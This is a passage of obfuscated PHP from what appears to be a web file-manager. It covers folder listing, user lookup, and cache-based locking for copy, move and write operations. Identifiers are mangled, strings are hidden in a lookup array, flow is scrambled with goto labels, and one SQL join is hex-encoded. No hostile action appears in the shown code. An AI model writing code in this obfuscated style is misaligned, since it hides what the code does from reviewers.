$Aœê×ÎÊ±Ã[157] . $F„Ó¥‰íÓª[$Aœê×ÎÊ±Ã[28]] . $Aœê×ÎÊ±Ã[476]; } } else { if ($DÛ˜©ĞØ™[$Aœê×ÎÊ±Ã[371]] == self::TYPE_GROUP) { $F„Ó¥‰íÓª = Model($Aœê×ÎÊ±Ã[458])->getInfoSimple($DÛ˜©ĞØ™[$Aœê×ÎÊ±Ã[456]]); $Cë‹ÓãØš = $F„Ó¥‰íÓª[$Aœê×ÎÊ±Ã[28]]; } else { if ($DÛ˜©ĞØ™[$Aœê×ÎÊ±Ã[371]] == self::TYPE_SYSTEM) { $F„Ó¥‰íÓª = $this->sourceInfo($CŠ†‡ÊŠ—¢[0], !0); $Cë‹ÓãØš = $F„Ó¥‰íÓª[$Aœê×ÎÊ±Ã[28]]; } } } $Cë‹ÓãØš = $Cë‹ÓãØš ? $Aœê×ÎÊ±Ã[8] . $Cë‹ÓãØš . $Aœê×ÎÊ±Ã[8] : $Aœê×ÎÊ±Ã[8]; return $Cë‹ÓãØš; } protected function _listAppendUser(&$e‚ ¹îÎ„Ş) { $dÜÙÅĞÙ‘œ =& $_SERVER[îÖ]; $A¥”ŠáÇ³ = array_to_keyvalue($e‚ ¹îÎ„Ş, $dÜÙÅĞÙ‘œ[33], $dÜÙÅĞÙ‘œ[378]); $CÊµò‡‘îË = array_to_keyvalue($e‚ ¹îÎ„Ş, $dÜÙÅĞÙ‘œ[33], $dÜÙÅĞÙ‘œ[379]); $E Àµ–ŒŸ = array_merge($A¥”ŠáÇ³, $CÊµò‡‘îË); $eäóğ‚Æ×Ğ = Model($dÜÙÅĞÙ‘œ[477])->userListInfo($E Àµ–ŒŸ); foreach ($e‚ ¹îÎ„Ş as &$a¯¢ÏÉöÙ´) { $bãÈ—äÌî¥ = $a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[378]]; $a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[378]] = $eäóğ‚Æ×Ğ[$bãÈ—äÌî¥] ? $eäóğ‚Æ×Ğ[$bãÈ—äÌî¥] : !1; $bãÈ—äÌî¥ = $a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[379]]; $a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[379]] = $eäóğ‚Æ×Ğ[$bãÈ—äÌî¥] ? $eäóğ‚Æ×Ğ[$bãÈ—äÌî¥] : !1; if (isset($a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[417]]) && $a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[417]][$dÜÙÅĞÙ‘œ[478]]) { $aŸ•áÚŒ Â = $GLOBALS[$dÜÙÅĞÙ‘œ[6]][$dÜÙÅĞÙ‘œ[84]][$dÜÙÅĞÙ‘œ[479]]; if ($a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[417]][$dÜÙÅĞÙ‘œ[480]] <= time() - $aŸ•áÚŒ Â) { $this->metaSet($a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[369]], $dÜÙÅĞÙ‘œ[478], null); $this->metaSet($a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[369]], $dÜÙÅĞÙ‘œ[480], null); unset($a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[417]][$dÜÙÅĞÙ‘œ[478]]); continue; } $DÈ³¿›‹¾ = $a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[417]][$dÜÙÅĞÙ‘œ[478]]; $a¯¢ÏÉöÙ´[$dÜÙÅĞÙ‘œ[417]][$dÜÙÅĞÙ‘œ[481]] = Model($dÜÙÅĞÙ‘œ[477])->getInfoSimpleOuter($DÈ³¿›‹¾); } } } public function parentLevelArray($d¤¹Õ‰ôˆè) { $FôßÎ×†›õ =& $_SERVER[îÖ]; $d¤¹Õ‰ôˆè = explode($FôßÎ×†›õ[47], trim($d¤¹Õ‰ôˆè, $FôßÎ×†›õ[47])); return array_remove_value($d¤¹Õ‰ôˆè, $FôßÎ×†›õ[468]); } public function listAll($Bïªé‰˜Î) { goto f”ĞÈêõ‘¿; f”ĞÈêõ‘¿: $Eå§Ê†æ =& $_SERVER[îÖ]; $Aº¸¸î†‡­ = $this->sourceInfo($Bïªé‰˜Î); $AœÃ¾ç˜…Ø = array($Eå§Ê†æ[482] => array($Eå§Ê†æ[483], $Aº¸¸î†‡­[$Eå§Ê†æ[459]] . $Bïªé‰˜Î . $Eå§Ê†æ[484]), $Eå§Ê†æ[485] => 0); goto b¯”­ÂŠö; ašåÕ˜¹¡ë: $eä×ÉøÑ‚İ = array_to_keyvalue($eä×ÉøÑ‚İ, $Eå§Ê†æ[369]); $D¹±Îò´’ñ = "\x2f{$Aº¸¸î†‡­[$Eå§Ê†æ[28]]}\x2f"; $D¹±Îò´’ñ = $D¹±Îò´’ñ == $Eå§Ê†æ[467] ? $Eå§Ê†æ[8] : $D¹±Îò´’ñ; goto bÃ…Õ¼Šîå; bÃ…Õ¼Šîå: $cæ¬©ˆİé = array(); foreach ($eä×ÉøÑ‚İ as $B¦İÖé™ç¾ => $e»ë§õƒ¾•) { goto AŞÖØ‘™«Ú; AŞÖØ‘™«Ú: $A®‰±Àë’ = $this->parentLevelArray($e»ë§õƒ¾•[$Eå§Ê†æ[459]]); array_shift($A®‰±Àë’); $AÊÖçáÓáç = $D¹±Îò´’ñ; goto BòŠ­ªÍ¶Ë; dÄ˜™¶®Øè: if (!$e»ë§õƒ¾•[$Eå§Ê†æ[370]]) { $E±†©«Ûôß[$Eå§Ê†æ[419]] = $e»ë§õƒ¾•[$Eå§Ê†æ[419]]; $E±†©«Ûôß[$Eå§Ê†æ[489]] = $e»ë§õƒ¾•[$Eå§Ê†æ[75]]; } $cæ¬©ˆİé[] = $E±†©«Ûôß; goto c×´’Â¨ Á; A”³…¾Áƒ½: $AÊÖçáÓáç = str_replace($Eå§Ê†æ[467], $Eå§Ê†æ[8], $AÊÖçáÓáç); $AÊÖçáÓáç = str_replace($Eå§Ê†æ[467], $Eå§Ê†æ[8], $AÊÖçáÓáç); $E±†©«Ûôß = array($Eå§Ê†æ[387] => str_replace($Eå§Ê†æ[467], $Eå§Ê†æ[8], $AÊÖçáÓáç), $Eå§Ê†æ[488] => intval($e»ë§õƒ¾•[$Eå§Ê†æ[370]]), $Eå§Ê†æ[391] => $this->pathInfoFilter($e»ë§õƒ¾•, !0)); goto dÄ˜™¶®Øè; BòŠ­ªÍ¶Ë: for ($A½‰ŒÅ’å = 0; $A½‰ŒÅ’å < count($A®‰±Àë’); $A½‰ŒÅ’å++) { $AÊÖçáÓáç .= $eä×ÉøÑ‚İ[$A®‰±Àë’[$A½‰ŒÅ’å]][$Eå§Ê†æ[28]] . $Eå§Ê†æ[8]; } $AÊÖçáÓáç .= $e»ë§õƒ¾•[$Eå§Ê†æ[28]]; if ($e»ë§õƒ¾•[$Eå§Ê†æ[370]]) { $AÊÖçáÓáç .= $Eå§Ê†æ[8]; } goto A”³…¾Áƒ½; c×´’Â¨ Á: } return $cæ¬©ˆİé; goto b±õçå‚é£; aÍÈ—ÄÓ¨Ú: $this->_listAppendAuth($eä×ÉøÑ‚İ); $this->_listAppendUser($eä×ÉøÑ‚İ); $this->_listAppendPath($eä×ÉøÑ‚İ); goto ašåÕ˜¹¡ë; b¯”­ÂŠö: $bÇÚ¥„†ò… = $Eå§Ê†æ[486]; $e³Ü‡Ê–íö = "\x4c\x45\x46\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\x66\x69\x6c\x65\x20\x66\x69\x6c\145\x20\157\x6e\40\163\x6f\x75\162\x63\x65\56\x66\x69\x6c\145\111\104\x20\75\40\x66\x69\154\x65\x2e\x66\151\154\x65\x49\x44"; $eä×ÉøÑ‚İ = $this->alias($Eå§Ê†æ[487])->field($bÇÚ¥„†ò…)->where($AœÃ¾ç˜…Ø)->join($e³Ü‡Ê–íö)->select(); goto aÍÈ—ÄÓ¨Ú; b±õçå‚é£: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($D˜íÓ¶ ×) { goto bˆ™°›²Å; D·øà”ÌÈâ: $this->_lockEvent($D˜íÓ¶ ×, array($d‚¦ÇåÜŸ«[493], $d‚¦ÇåÜŸ«[494]), $C¹›¾ßßÏ); $this->_lockCheckEnd($d‚¦ÇåÜŸ«[490], $D˜íÓ¶ ×); goto C’ÌÌ•ï„; EŒ³‰®¡Ñ‰: $C¹›¾ßßÏ = 1; $this->_lockEvent($D˜íÓ¶ ×, array($d‚¦ÇåÜŸ«[491], $d‚¦ÇåÜŸ«[492]), $C¹›¾ßßÏ); $this->_lockParent($D˜íÓ¶ ×, array($d‚¦ÇåÜŸ«[492]), $C¹›¾ßßÏ); goto D·øà”ÌÈâ; bˆ™°›²Å: $d‚¦ÇåÜŸ« =& $_SERVER[îÖ]; if (!$this->allowLock()) { return; } $this->_lockCheck($d‚¦ÇåÜŸ«[490], $D˜íÓ¶ ×); goto EŒ³‰®¡Ñ‰; C’ÌÌ•ï„: } public function lockCopyEnd($dºÏˆÚî¬×) { $fòÉÑ†í¡… =& $_SERVER[îÖ]; if (!$this->allowLock()) { return; } $CŠÂÊñëù = 0; $this->_lockEvent($dºÏˆÚî¬×, array($fòÉÑ†í¡…[491], $fòÉÑ†í¡…[492]), $CŠÂÊñëù); $this->_lockParent($dºÏˆÚî¬×, array($fòÉÑ†í¡…[492]), $CŠÂÊñëù); $this->_lockEvent($dºÏˆÚî¬×, array($fòÉÑ†í¡…[493], $fòÉÑ†í¡…[494]), $CŠÂÊñëù); } public function lockWriteStart($díƒ™ˆ£ºˆ, $b³êˆ“İ—¤ = '') { goto B˜ª—ÖËÅ·; B˜ª—ÖËÅ·: $aèõ›ø×Üâ =& $_SERVER[îÖ]; if (!$this->allowLock()) { return; } $this->_lockCheck($aèõ›ø×Üâ[491], $díƒ™ˆ£ºˆ); goto f‹Ëà¬±›; f‹Ëà¬±›: $FÅ›„ƒŸ¥ = 1; $this->_lockKey($aèõ›ø×Üâ[495] . $díƒ™ˆ£ºˆ . $aèõ›ø×Üâ[91] . $b³êˆ“İ—¤, $FÅ›„ƒŸ¥); $this->_lockEvent($díƒ™ˆ£ºˆ, array($aèõ›ø×Üâ[490], $aèõ›ø×Üâ[492]), $FÅ›„ƒŸ¥); goto cË™Œ‡‚¾†; cË™Œ‡‚¾†: $this->_lockParent($díƒ™ˆ£ºˆ, array($aèõ›ø×Üâ[490], $aèõ›ø×Üâ[492]), $FÅ›„ƒŸ¥); $this->_lockCheckEnd($aèõ›ø×Üâ[491], $díƒ™ˆ£ºˆ); goto F°Î¢„Á¬; F°Î¢„Á¬: } public function lockWriteEnd($a„ÌƒÍ™¿¡, $FîÌÖª† = '') { $d„Á´å° =& $_SERVER[îÖ]; if (!$this->allowLock()) { return; } $Dµ¡èå·õ = 0; $this->_lockKey($d„Á´å°[495] . $a„ÌƒÍ™¿¡ . $d„Á´å°[91] . $FîÌÖª†, $Dµ¡èå·õ); $this->_lockEvent($a„ÌƒÍ™¿¡, array($d„Á´å°[490], $d„Á´å°[492]), $Dµ¡èå·õ); $this->_lockParent($a„ÌƒÍ™¿¡, array($d„Á´å°[490], $d„Á´å°[492]), $Dµ¡èå·õ); } public function lockMoveStart($b´Š”óª®Å) { goto AŸë¤íæÚ; EÍ”êÎàòÅ: $this->_lockParent($b´Š”óª®Å, array($Dó‹ŠºÑé[490], $Dó‹ŠºÑé[492]), $DÂêÛ¬×ª); $this->_lockEvent($b´Š”óª®Å, array($Dó‹ŠºÑé[497], $Dó‹ŠºÑé[493], $Dó‹ŠºÑé[494]), $DÂêÛ¬×ª); $this->_lockCheckEnd($Dó‹ŠºÑé[492], $b´Š”óª®Å); goto F¯£ÕÖİÊ·; cãøÃ¡ö: $DÂêÛ¬×ª = 1; $this->_lockKey($Dó‹ŠºÑé[496] . $b´Š”óª®Å, $DÂêÛ¬×ª); $this->_lockEvent($b´Š”óª®Å, array($Dó‹ŠºÑé[490], $Dó‹ŠºÑé[491]), $DÂêÛ¬×ª); goto EÍ”êÎàòÅ; AŸë¤íæÚ: $Dó‹ŠºÑé =& $_SERVER[îÖ]; if (!$this->allowLock()) { return; } $this->_lockCheck($Dó‹ŠºÑé[492], $b´Š”óª®Å); goto cãøÃ¡ö; F¯£ÕÖİÊ·: } public function lockMoveEnd($eÀ•¸ßÖ°) { goto eè³ËæÀÄõ; eè³ËæÀÄõ: $D”Ê­ó½ù” =& $_SERVER[îÖ]; if (!$this->allowLock()) { return; } $EøòóÀÈÇ = 0; goto bŒÂªãÃóö; bŒÂªãÃóö: $this->_lockKey($D”Ê­ó½ù”[496] . $eÀ•¸ßÖ°, $EøòóÀÈÇ); $this->_lockEvent($eÀ•¸ßÖ°, array($D”Ê­ó½ù”[490], $D”Ê­ó½ù”[491]), $EøòóÀÈÇ); $this->_lockParent($eÀ•¸ßÖ°, array($D”Ê­ó½ù”[490], $D”Ê­ó½ù”[492]), $EøòóÀÈÇ); goto c¬íÏ¾×; c¬íÏ¾×: $this->_lockEvent($eÀ•¸ßÖ°, array($D”Ê­ó½ù”[497], $D”Ê­ó½ù”[493], $D”Ê­ó½ù”[494]), $EøòóÀÈÇ); goto AÚö«”‘µã; AÚö«”‘µã: } private function _lockCheck($cŒ«”Õå, $b‡­ÂÎĞé) { goto FÃØñß¯„§; c²¼ñé¦ç: CacheLock::setErrorMsg($AŠ÷õ…ïë¹[157] . htmlspecialchars($cŒİÕãŞË…[$AŠ÷õ…ïë¹[28]]) . $AŠ÷õ…ïë¹[476] . $aÁ¯è‡ñ×ã); $this->_lockKey($C†‡Í÷Õá÷, 1); $this->_lockKey($C†‡Í÷Õá÷, 0); goto BÄˆ¼Í¶Á¶; FÃØñß¯„§: $AŠ÷õ…ïë¹ =& $_SERVER[îÖ]; $cŒİÕãŞË… = $this->sourceInfo($b‡­ÂÎĞé); $C†‡Í÷Õá÷ = $cŒ«”Õå . $AŠ÷õ…ïë¹[91] . $b‡­ÂÎĞé; goto dò†ÛæÈ; BÄˆ¼Í¶Á¶: $eéÖ¬¡á› = array_reverse($this->parentLevelArray($cŒİÕãŞË…[$AŠ÷õ…ïë¹[459]])); foreach ($eéÖ¬¡á› as $AâÁ‚Æ³°‘) { $C†‡Í÷Õá÷ = $cŒ«”Õå . $AŠ÷õ…ïë¹[499] . $AâÁ‚Æ³°‘; if (CacheLock::lockGet($AŠ÷õ…ïë¹[500] . $C†‡Í÷Õá÷)) { $cŒİÕãŞË… = $this->sourceInfo($AâÁ‚Æ³°‘); CacheLock::setErrorMsg($AŠ÷õ…ïë¹[157] . htmlspecialchars($cŒİÕãŞË…[$AŠ÷õ…ïë¹[28]]) . $AŠ÷õ…ïë¹[476] . $aÁ¯è‡ñ×ã); $this->_lockKey($C†‡Í÷Õá÷, 1); $this->_lockKey($C†‡Í÷Õá÷, 0); } } goto a»Ù·““›ƒ; dò†ÛæÈ: $this->_lockTimeStart[$C†‡Í÷Õá÷] = timeFloat(); if (!is_array($cŒİÕãŞË…)) { return; } $aÁ¯è‡ñ×ã = LNG($AŠ÷õ…ïë¹[498]); goto c²¼ñé¦ç; a»Ù·““›ƒ: } private function _lockCheckEnd($C¨­—®òîØ, $C°½ø³ìË¹) { goto eÑ˜‡‡ÒÌÍ; Eô»ø›®šÔ: if ($C‡â´°ÌŠ > 0.5) { unset(self::$cacheSourceInfo[$D„íŠöæ¹³[410] . $C°½ø³ìË¹]); } $FÓ¦ÄìÇ²­ = $this->sourceInfo($C°½ø³ìË¹); if (!$FÓ¦ÄìÇ²­) { show_json(LNG($D„íŠöæ¹³[101]), !1); } goto cÂÈ‡ù£; b»ê«‘÷Æ: if (!isset($this->_lockTimeStart[$e±¥–‚¾¨ª])) { return; } $C‡â´°ÌŠ = timeFloat() - $this->_lockTimeStart[$e±¥–‚¾¨ª]; unset($this->_lockTimeStart[$e±¥–‚¾¨ª]); goto Eô»ø›®šÔ; eÑ˜‡‡ÒÌÍ: $D„íŠöæ¹³ =& $_SERVER[îÖ]; $e±¥–‚¾¨ª = $C¨­—®òîØ . $D„íŠöæ¹³[91] . $C°½ø³ìË¹; CacheLock::setErrorMsg($D„íŠöæ¹³[361]); goto b»ê«‘÷Æ; cÂÈ‡ù£: } private function _lockParent($DåÏåê¿ó, $c£ŠÅÁ¬ø½, $FÁòÒ†‘ÆØ) { if (!$this->autoLockSet) { return; } $AÆ®ºÎ¢¬ = $this->sourceInfo($DåÏåê¿ó); if (!is_array($AÆ®ºÎ¢¬)) { return; } $eÅç¶§½óô = array_reverse($this->parentLevelArray($AÆ®ºÎ¢¬[$_SERVER[îÖ][459]])); foreach ($eÅç¶§½óô as $eÜ’Ú›´×Â) { $this->_lockEvent($eÜ’Ú›´×Â, $c£ŠÅÁ¬ø½, $FÁòÒ†‘ÆØ); } } private function _lockEvent($fÔÇ‚ÑÀø®, $c²¸Ğ´‹Ôê, $A¾†ÊïÁÚ) { $d„‘à‘Ú†¸ =& $_SERVER[îÖ]; if (!$this->autoLockSet) { return; } foreach ($c²¸Ğ´‹Ôê as $bÃôÌ¹ğ©¸) { $EöÑ‚öœô = $bÃôÌ¹ğ©¸ . $d„‘à‘Ú†¸[91] . $fÔÇ‚ÑÀø®; if ($A¾†ÊïÁÚ && CacheLock::lockGet($d„‘à‘Ú†¸[500] . $EöÑ‚öœô)) { continue; } $this->_lockKey($EöÑ‚öœô, $A¾†ÊïÁÚ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($c‡è²ÇÃ‹ö, $Dëä‹‰Ø£Ä = 1) { $B®ª™ëù®Ñ = $_SERVER[îÖ][500] . md5($c‡è²ÇÃ‹ö); if ($Dëä‹‰Ø£Ä) { if (isset(self::$_lockItemArr[$B®ª™ëù®Ñ])) { return; } self::$_lockItemArr[$B®ª™ëù®Ñ] = 1; CacheLock::lock($B®ª™ëù®Ñ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$B®ª™ëù®Ñ])) { return; } unset(self::$_lockItemArr[$B®ª™ëù®Ñ]); CacheLock::unlock($B®ª™ëù®Ñ); } } public function isParentOf($B™¶³á, $Eš±Òç·­) { goto a«‘½ñï£; c’’ğ î‘é: return $e™“”¢â¾Æ; goto Dì²ÔŒ±˜ù; a«‘½ñï£: $A­ÅŸ²´ß‹ =& $_SERVER[îÖ]; $EŠù™‰·”Ü = $this->sourceInfo($B™¶³á); $E±ñ„ÛÎâ = $this->sourceInfo($Eš±Òç·­); goto f¡¾Ä„æÊÛ; f¡¾Ä„æÊÛ: $bÚ’°Óíº‡ = $EŠù™‰·”Ü[$A­ÅŸ²´ß‹[459]] . $EŠù™‰·”Ü[$A­ÅŸ²´ß‹[369]] . $A­ÅŸ²´ß‹[47]; $F¿°ôÙ¼§Ÿ = $E±ñ„ÛÎâ[$A­ÅŸ²´ß‹[459]] . $E±ñ„ÛÎâ[$A­ÅŸ²´ß‹[369]] . $A­ÅŸ²´ß‹[47]; $e™“”¢â¾Æ = strpos($F¿°ôÙ¼§Ÿ, $bÚ’°Óíº‡) === 0; goto c’’ğ î‘é; Dì²ÔŒ±˜ù: } private $targetIsDelete = 0; public function copy($D…ÒÈ°ÈŸ, $E‰¼ºãî……, $E¦¦ö¯Œ­È = REPEAT_REPLACE, $cš¤ÍÒá²á = '') { goto c™„âÆÇÛ; bÃÀ÷¢¾«: $this->saveAll($a³†Şô§†Ÿ[$eê¹´Û®ó»[503]]); Model($eê¹´Û®ó»[167])->linkAdd($a³†Şô§†Ÿ[$eê¹´Û®ó»[501]]); $this->folderSizeReset($E‰¼ºãî……); goto EÔˆÈ³ì×…; cÌ’æÈƒ¢Š: $this->targetIsDelete = intval($D­¨õŠ„‰é[$eê¹´Û®ó»[397]]); $dÈÂÓæ­«Å = $this->fileNameExistCache($E‰¼ºãî……, $D­¨õŠ„‰é[$eê¹´Û®ó»[28]]); $EëôÙçïÃ² = $this->_copy($D…ÒÈ°ÈŸ, $E‰¼ºãî……, $E¦¦ö¯Œ­È, $a³†Şô§†Ÿ, !0, $cš¤ÍÒá²á); goto Bƒ´ŠÚÊğ˜; d¼‰ŸÙĞ¢“: $this->lockCopyStart($D…ÒÈ°ÈŸ); $this->lockWriteStart($E‰¼ºãî……, $bÉ²°‹çµä); $a³†Şô§†Ÿ = array($eê¹´Û®ó»[501] => array(), $eê¹´Û®ó»[502] => array(), $eê¹´Û®ó»[503] => array()); goto cÌ’æÈƒ¢Š; EÔˆÈ³ì×…: $this->updateModifyTime($E‰¼ºãî……); return $EëôÙçïÃ²; goto a‰¥õ”¹Ñ; Bƒ´ŠÚÊğ˜: $this->_childrenListClear(); $this->lockCopyEnd($D…ÒÈ°ÈŸ); $this->lockWriteEnd($E‰¼ºãî……, $bÉ²°‹çµä); goto Cç÷Úö¶¬ì; c½â×œòÉİ: if (!$D­¨õŠ„‰é || !$aôÖŒ¹»ôÓ || $aôÖŒ¹»ôÓ[$eê¹´Û®ó»[370]] != $eê¹´Û®ó»[83]) { return !1; } if ($this->isParentOf($D…ÒÈ°ÈŸ, $E‰¼ºãî……)) { return !1; } $bÉ²°‹çµä = $cš¤ÍÒá²á ? $cš¤ÍÒá²á : $D­¨õŠ„‰é[$eê¹´Û®ó»[28]]; goto d¼‰ŸÙĞ¢“; c™„âÆÇÛ: $eê¹´Û®ó» =& $_SERVER[îÖ]; $D­¨õŠ„‰é = $this->sourceInfo($D…ÒÈ°ÈŸ); $aôÖŒ¹»ôÓ = $this->sourceInfo($E‰¼ºãî……); goto c½â×œòÉİ; Cç÷Úö¶¬ì: if ($D­¨õŠ„‰é[$eê¹´Û®ó»[370]] == $eê¹´Û®ó»[83] && $dÈÂÓæ­«Å == $EëôÙçïÃ²) { $this->folderSizeResetChildren($dÈÂÓæ­«Å); } Model($eê¹´Û®ó»[504])->addAll($a³†Şô§†Ÿ[$eê¹´Û®ó»[502]], array(), !0); if ($dÈÂÓæ­«Å != $EëôÙçïÃ² || $D­¨õŠ„‰é[$eê¹´Û®ó»[370]] == $eê¹´Û®ó»[83]) { Model($eê¹´Û®ó»[505])->eventCopy($EëôÙçïÃ²); } goto bÃÀ÷¢¾«; a‰¥õ”¹Ñ: } private function _copy($F›µªğÛ‡Â, $cğÍÕ²‡¦‘, $E´êÄë¯ÉÆ, &$EèË‘¸‹¾, $E‚î„İŸ½‚, $B˜‰´‹á² = '') { goto b‚âè¼È±; b‚âè¼È±: $e„èÇ¤‚Ÿ‡ =& $_SERVER[îÖ]; $D‹·Ôë’íù = $this->sourceInfoCache($F›µªğÛ‡Â); $CŞçéïŸˆÄ = $D‹·Ôë’íù[$e„èÇ¤‚Ÿ‡[370]] == $e„èÇ¤‚Ÿ‡[83]; goto d…ŒáÒãã; Fö¡„—•£: if (!$FÌå†ƒä’Õ) { return $this->_copyCreate($F›µªğÛ‡Â, $cğÍÕ²‡¦‘, $cÑø¢ƒĞõä, $EèË‘¸‹¾); } $d±¸ù‘ÌšÀ = $FÌå†ƒä’Õ; if ($CŞçéïŸˆÄ) { if ($E´êÄë¯ÉÆ == REPEAT_RENAME_FOLDER) { $cÑø¢ƒĞõä = $this->fileNameAutoCache($cğÍÕ²‡¦‘, $cÑø¢ƒĞõä, $E´êÄë¯ÉÆ, $CŞçéïŸˆÄ); $d±¸ù‘ÌšÀ = $this->_copyCreate($F›µªğÛ‡Â, $cğÍÕ²‡¦‘, $cÑø¢ƒĞõä, $EèË‘¸‹¾); } else { $a¼›÷Í°á± = $this->_childrenList($F›µªğÛ‡Â); foreach ($a¼›÷Í°á± as $d•ï‹·š½Š) { $this->_copy($d•ï‹·š½Š[$e„èÇ¤‚Ÿ‡[369]], $FÌå†ƒä’Õ, $E´êÄë¯ÉÆ, $EèË‘¸‹¾, !1); } } } else { if ($E´êÄë¯ÉÆ == REPEAT_RENAME || $E´êÄë¯ÉÆ == REPEAT_RENAME_FOLDER) { $cÑø¢ƒĞõä = $this->fileNameAutoCache($cğÍÕ²‡¦‘, $cÑø¢ƒĞõä, $E´êÄë¯ÉÆ, $CŞçéïŸˆÄ); $d±¸ù‘ÌšÀ = $this->_copyCreate($F›µªğÛ‡Â, $cğÍÕ²‡¦‘, $cÑø¢ƒĞõä, $EèË‘¸‹¾); } else { if ($E´êÄë¯ÉÆ == REPEAT_REPLACE) { $bˆà––…ì = $this->sourceInfoCache($FÌå†ƒä’Õ); $F­„ËÆ­ŞÇ = $this->fileHistory($bˆà––…ì, $D‹·Ôë’íù[$e„èÇ¤‚Ÿ‡[419]], $D‹·Ôë’íù[$e„èÇ¤‚Ÿ‡[77]]); if ($F­„ËÆ­ŞÇ) { $EèË‘¸‹¾[$e„èÇ¤‚Ÿ‡[501]][] = $D‹·Ôë’íù[$e„èÇ¤‚Ÿ‡[419]]; } } else { if ($E´êÄë¯ÉÆ == REPEAT_SKIP) { } } } Hook::trigger($e„èÇ¤‚Ÿ‡[506], array($e„èÇ¤‚Ÿ‡[507], $D‹·Ôë’íù, 0)); } goto Dé‚æÂ¿¿â; d…ŒáÒãã: $cÑø¢ƒĞõä = $B˜‰´‹á² ? $B˜‰´‹á² : $D‹·Ôë’íù[$e„èÇ¤‚Ÿ‡[28]]; $FÌå†ƒä’Õ = $this->fileNameExistCache($cğÍÕ²‡¦‘, $cÑø¢ƒĞõä); if ($E‚î„İŸ½‚) { $this->_childrenAllMake($F›µªğÛ‡Â); if ($CŞçéïŸˆÄ && $FÌå†ƒä’Õ) { $this->_childrenAllMake($FÌå†ƒä’Õ); } } goto Fö¡„—•£; Dé‚æÂ¿¿â: return $d±¸ù‘ÌšÀ; goto dˆ© ’Æ­; dˆ© ’Æ­: } private function _copyCreate($aŸ´ˆÌ‚¹—, $d–“œ¼â˜Ü, $b‡ÜØ»‡, &$f”Ó÷ …’Œ) { goto fñï†×âê; b¹ñ ²‡ÛÖ: $C–Ğ¬ƒÙÔÜ[$aŸ´ˆÌ‚¹—] = $C†Œ¨¦¿Ğã; $bŞ¼Íˆìµ = array(); $dî¤·«¦ÕÇ = array(); goto dƒöÇ¤ôˆë; fæ¤ÏŒæ°ˆ: if ($EŒ®§•Ÿñ[$bù½ÒÓÛË‡[370]] != $bù½ÒÓÛË‡[83]) { $f”Ó÷ …’Œ[$bù½ÒÓÛË‡[501]][] = $EŒ®§•Ÿñ[$bù½ÒÓÛË‡[419]]; return $C†Œ¨¦¿Ğã; } $bÙ•‚… ­É = array(); $bÄÑ•¿’¸ß = array(); goto Dçºê®œ‰î; eß˜Ó‚×ƒÏ: $c´¶ŠÓ„”å = $this->_makeItemData($EŒ®§•Ÿñ, $E÷½›ğŠ, $b‡ÜØ»‡); Hook::trigger($bù½ÒÓÛË‡[508], $c´¶ŠÓ„”å); Hook::trigger($bù½ÒÓÛË‡[509], array($bù½ÒÓÛË‡[510], $c´¶ŠÓ„”å, 0)); goto c„ŞÛ¥¤; Dçºê®œ‰î: $this->_childrenListAll($aŸ´ˆÌ‚¹—, $bÙ•‚… ­É); $dË“–£ƒ‘ß = count($bÙ•‚… ­É); if ($dË“–£ƒ‘ß == 0) { return $C†Œ¨¦¿Ğã; } goto F¤²î‚§í; F¤²î‚§í: $A¹øÓì¸ÜÈ = $this->sourceInfo($C†Œ¨¦¿Ğã); foreach ($bÙ•‚… ­É as $däÀºõñÌÏ) { $CË»Œ‘‚º« = $this->_makeItemData($däÀºõñÌÏ, $A¹øÓì¸ÜÈ, $däÀºõñÌÏ[$bù½ÒÓÛË‡[28]]); $CË»Œ‘‚º«[$bù½ÒÓÛË‡[459]] = $däÀºõñÌÏ[$bù½ÒÓÛË‡[459]]; $bÄÑ•¿’¸ß[] = $CË»Œ‘‚º«; } $this->chunkEventSet($bù½ÒÓÛË‡[511], array($bù½ÒÓÛË‡[512], $c´¶ŠÓ„”å, $dË“–£ƒ‘ß)); goto B…—¸Õ¸øù; AİÓ³ïéŸ¶: $this->chunkEventSet($bù½ÒÓÛË‡[515], array($bù½ÒÓÛË‡[516], $c´¶ŠÓ„”å, $dË“–£ƒ‘ß)); $this->saveAll($dî¤·«¦ÕÇ); return $C†Œ¨¦¿Ğã; goto F¾µ¼éª™Ç; B…—¸Õ¸øù: $this->addAll($bÄÑ•¿’¸ß, array(), !1); $c‹ø©§‘†à = $this->where(array($bù½ÒÓÛË‡[461] => $C†Œ¨¦¿Ğã))->select(); $C–Ğ¬ƒÙÔÜ = $this->_childrenMakeRelation($bÙ•‚… ­É, $c‹ø©§‘†à); goto b¹ñ ²‡ÛÖ; c„ŞÛ¥¤: $C†Œ¨¦¿Ğã = $this->add($c´¶ŠÓ„”å); $cšÜÆË¯é = array($bù½ÒÓÛË‡[369] => $C†Œ¨¦¿Ğã, $bù½ÒÓÛË‡[28] => $b‡ÜØ»‡); $this->_copyApplyMeta($cšÜÆË¯é, $f”Ó÷ …’Œ); goto fæ¤ÏŒæ°ˆ; fñï†×âê: $bù½ÒÓÛË‡ =& $_SERVER[îÖ]; $EŒ®§•Ÿñ = $this->sourceInfoCache($aŸ´ˆÌ‚¹—); $E÷½›ğŠ = $this->sourceInfoCache($d–“œ¼â˜Ü); goto eß˜Ó‚×ƒÏ; dƒöÇ¤ôˆë: foreach ($c‹ø©§‘†à as $däÀºõñÌÏ) { $EÄŒ–›™Ëº = $däÀºõñÌÏ[$bù½ÒÓÛË‡[369]]; $Eâ¹¿ØÅôÀ = $this->_childrenMatch($C–Ğ¬ƒÙÔÜ, $däÀºõñÌÏ, $A¹øÓì¸ÜÈ); $bŞ¼Íˆìµ[] = array($bù½ÒÓÛË‡[369], $EÄŒ–›™Ëº, $bù½ÒÓÛË‡[461], 